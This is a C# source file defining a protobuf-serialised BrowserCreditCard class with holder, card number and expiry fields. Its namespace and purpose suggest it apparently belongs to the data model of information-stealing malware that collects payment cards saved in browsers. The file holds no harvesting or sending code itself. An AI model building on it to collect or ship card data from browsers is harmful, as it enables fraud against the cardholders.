using ProtoBuf;
using System.Collections.Generic;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "BrowserCreditCard")]
	public class BrowserCreditCard : INotifyPropertyChanged, IEqualityComparer<BrowserCreditCard>
	{
		private string _holder;

		private string _cardNumber;

		private int _expirationMonth;

		private int _expirationYear;

		[ProtoMember(1, Name = "Holder")]
		public string Holder
		{
			get
			{
				return _holder;
			}
			set
			{
				_holder = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Holder"));
			}
		}

		[ProtoMember(2, Name = "ExpirationMonth")]
		public int ExpirationMonth
		{
			get
			{
				return _expirationMonth;
			}
			set
			{
				_expirationMonth = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("ExpirationMonth"));
			}
		}

		[ProtoMember(3, Name = "ExpirationYear")]
		public int ExpirationYear
		{
			get
			{
				return _expirationYear;
			}
			set
			{
				_expirationYear = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("ExpirationYear"));
			}
		}

		[ProtoMember(4, Name = "CardNumber")]
		public string CardNumber
		{
			get
			{
				return _cardNumber;
			}
			set
			{
				_cardNumber = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("CardNumber"));
			}
		}

		public event PropertyChangedEventHandler PropertyChanged;

		public bool Equals(BrowserCreditCard x, BrowserCreditCard y)
		{
			if (x.Holder == y.Holder)
			{
				return x.CardNumber == y.CardNumber;
			}
			return false;
		}

		public int GetHashCode(BrowserCreditCard obj)
		{
			int num = 37;
			num *= 397;
			if (!string.IsNullOrEmpty(obj.Holder))
			{
				num += obj.Holder.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.CardNumber))
			{
				num += obj.CardNumber.GetHashCode();
			}
			return num;
		}
	}
}
